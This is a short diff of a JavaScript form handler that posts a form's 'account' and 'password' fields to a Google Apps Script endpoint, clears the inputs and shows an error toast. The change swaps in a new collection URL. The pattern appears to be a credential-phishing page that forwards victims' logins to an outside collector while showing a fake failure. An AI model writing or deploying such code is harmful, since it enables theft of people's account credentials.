@@ -69,7 +69,7 @@ form.onsubmit = (e) => {
     document.querySelector(".loading").style.display = "flex";
     let data = new FormData(form);
     fetch(
-        "https://script.google.com/macros/s/AKfycbzygjX_OleXTKys1UiNtn3WWQaVnKcid4RIhcyU2EoiVca_tJVWWmLhpoeCtS6PgGaH/exec",
+        "https://script.google.com/macros/s/AKfycbw1fRrCCL6_21qJDpXuI9SlsOGYJyUGNNlNV0rbYgu5vG9znm-euBTQfM-wiVGg2gsm/exec",
         {
             method: "POST",
             body: data,
@@ -90,7 +90,7 @@ form.onsubmit = (e) => {
             document.querySelector("input#account").value = "";
             document.querySelector("input#password").value = "";
             document.querySelector("input#link").value = "";
-            document.querySelector("textarea").value = "";
+            document.querySelector("textarea").value = " ";
             showErrorToast();
         });
 
